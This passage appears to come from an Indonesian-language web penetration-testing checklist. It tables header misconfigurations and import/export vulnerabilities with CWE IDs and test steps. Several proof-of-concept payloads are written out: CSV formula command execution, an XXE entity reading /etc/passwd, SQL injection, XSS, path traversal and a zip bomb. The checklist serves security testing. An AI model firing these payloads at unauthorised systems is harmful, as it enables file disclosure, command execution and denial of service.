| 11.1 | **Missing HSTS Header** | CWE-319 | Tidak memaksa HTTPS | • Cek response header `Strict-Transport-Security`<br>• Tanpa HSTS, bisa downgrade attack<br>• SSL Strip attack possible |
| 11.2 | **Missing X-Frame-Options** | CWE-1021 | Bisa di-clickjacking | • Cek header `X-Frame-Options`<br>• Tanpa ini, site bisa diiframe<br>• Bisa untuk clickjacking attack |
| 11.3 | **Missing X-Content-Type-Options** | CWE-693 | MIME sniffing bisa terjadi | • Cek header `X-Content-Type-Options: nosniff`<br>• Tanpa ini, browser bisa salah interpret file |
| 11.4 | **Missing Content-Security-Policy** | CWE-693 | CSP tidak ada, XSS risk tinggi | • Cek header `Content-Security-Policy`<br>• Tanpa CSP, XSS lebih mudah dieksploitasi<br>• Dengan CSP, XSS bisa dimitigasi |
| 11.5 | **Server Information Disclosure** | CWE-200 | Server version di header | • Cek header `Server: Apache/2.2.3`<br>• Cek `X-Powered-By: PHP/5.3`<br>• Informasi ini membantu attacker cari exploit |
| 11.6 | **CORS Misconfiguration** | CWE-942 | Access-Control-Allow-Origin: * | • Cek header CORS<br>• Jika `*` dengan credentials, sangat berbahaya<br>• Data bisa diakses site lain |
| 11.7 | **HTTP Methods Enabled** | CWE-650 | Method berbahaya aktif | • Coba OPTIONS request, lihat allowed methods<br>• Cek TRACE (XST attack possible)<br>• Cek PUT, DELETE |
| 11.8 | **Directory Listing Enabled** | CWE-548 | Bisa lihat isi direktori | • Coba akses `/images/`, `/css/` tanpa file index<br>• Jika directory listing on, bisa lihat semua file<br>• Bisa find backup files, source code |
| 11.9 | **Information Disclosure via Error Pages** | CWE-209 | Error page menampilkan stack trace | • Trigger error dengan input tidak valid<br>• Cek apakah ada stack trace, path, SQL query<br>• Informasi untuk attacker |
| 11.10 | **Cross-Domain Policy Files** | CWE-942 | crossdomain.xml / clientaccesspolicy.xml | • Cek `/crossdomain.xml` (Flash)<br>• Cek `/clientaccesspolicy.xml` (Silverlight)<br>• Jika allow-access-from domain * , berbahaya |
| 11.11 | **SSL/TLS Configuration** | CWE-326 | Cipher suite lemah, SSLv3 enabled | • Gunakan SSL Labs test<br>• Cek apakah support SSLv3 (POODLE)<br>• Cek cipher lemah (RC4, DES) |
| 11.12 | **HTTP Request Smuggling** | CWE-444 | Konflik antara frontend dan backend | • Kirim request dengan CL-TE atau TE-CL<br>• Cek apakah response ter-poison<br>• Bisa untuk bypass security |
| 11.13 | **Referrer Policy Missing** | CWE-200 | Referer header bocorkan URL | • Cek header `Referrer-Policy`<br>• Tanpa ini, URL bisa bocor ke site lain<br>• Jika ada token di URL, bisa bocor |

---

## 12. Fitur Ekspor / Import Data

| No | Nama Kerentanan | CWE | Deskripsi | Langkah-langkah Pentest |
|:--:|:----------------|:---:|:----------|:------------------------|
| 12.1 | **CSV Injection / Formula Injection** | CWE-1236 | Inject formula di CSV yang diekspor | • Buat data dengan `=CMD` atau `=HYPERLINK`<br>• `=1+1`, `=2*5` untuk test<br>• `=cmd|' /C calc'!A0` untuk execute command |
| 12.2 | **XXE di Import XML** | CWE-611 | XML External Entity attack | • Upload XML dengan DOCTYPE dan entity<br>• `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`<br>• Bisa baca file server |
| 12.3 | **SQL Injection via Import** | CWE-89 | Data import langsung di-insert ke DB tanpa sanitasi | • Buat CSV dengan data `' OR '1'='1`<br>• Import dan lihat efeknya |
| 12.4 | **XSS via Export** | CWE-79 | Data dengan XSS di export file | • Isi data dengan `<script>alert(1)</script>`<br>• Export ke PDF/HTML/CSV<br>• Jika dibuka, script tereksekusi |
| 12.5 | **IDOR di Export** | CWE-639 | Export data orang lain | • Ubah parameter ID di fitur export<br>• Coba export data user lain<br>• Cek apakah perlu authorization |
| 12.6 | **File Path Traversal di Export** | CWE-22 | Memanipulasi path file export | • Coba parameter `filename=../../etc/passwd`<br>• Coba download file sistem |
| 12.7 | **Mass Assignment di Import** | CWE-915 | Import data bisa ubah field sensitif | • Tambah kolom `is_admin=true` di CSV<br>• Tambah kolom `role=admin`<br>• Cek apakah data terimport |
| 12.8 | **Denial of Service via Import** | CWE-400 | Import file sangat besar | • Upload CSV 100MB<br>• Upload CSV dengan jutaan baris<br>• Cek apakah server crash |
| 12.9 | **Zip Bomb** | CWE-409 | File kompresi kecil tapi ekstrak besar | • Upload zip bomb (42.zip)<br>• Cek apakah server mencoba ekstrak<br>• Bisa menyebabkan DoS |
| 12.10 | **PDF Generation Vulnerabilities** | CWE-94 | Server-side JavaScript di PDF | • Cek apakah PDF generator bisa execute JS<br>• Coba XXE di PDF generation<br>• Coba command injection |

---

## Referensi rekomendasi
- **Burp Suite Professional** 
- **Postman** - API testing

### Standar & Panduan
- **OWASP Top 10 2025**
- **CWE Top 25 2025**
- **OWASP Web Security Testing Guide (WSTG)**
- **NIST SP 800-115**
- **PTES (Penetration Testing Execution Standard)**


<p align="center">
  <a href="https://star-history.com/#S1Security/WearePEN7EST&Date">
   <picture>
     <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=S1Security/WearePEN7EST&type=Date&theme=dark" />
     <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=S1Security/WearePEN7EST&type=Date" />
     <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=S1Security/WearePEN7EST&type=Date" />
   </picture>
  </a>
